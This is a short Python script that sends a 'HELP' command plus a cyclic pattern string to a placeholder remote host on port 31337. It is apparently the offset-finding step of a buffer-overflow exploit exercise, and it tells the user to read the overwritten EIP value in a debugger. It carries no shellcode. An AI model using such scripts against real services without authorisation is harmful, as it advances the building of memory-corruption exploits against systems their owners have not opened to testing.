#!/usr/bin/python
import sys,socket
from termcolor import colored

cmd = "HELP" # Change this as needed
ip = "<RHOST>" # Change this as needed
port = 31337 # Change this as needed
payload = (
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac"
"6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A"
"f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9"
"Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
)

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	s.send((cmd+payload+'\r\n'))
	s.close()
	print(colored("[+] Payload sent!", "green"))
	print(colored("[*] Check your debugger", "green"))
	print(colored("[*] Grab the value located under the EIP", "green"))
except:
	print(colored("[-] Could not connect...", "red"))
	sys.exit(0)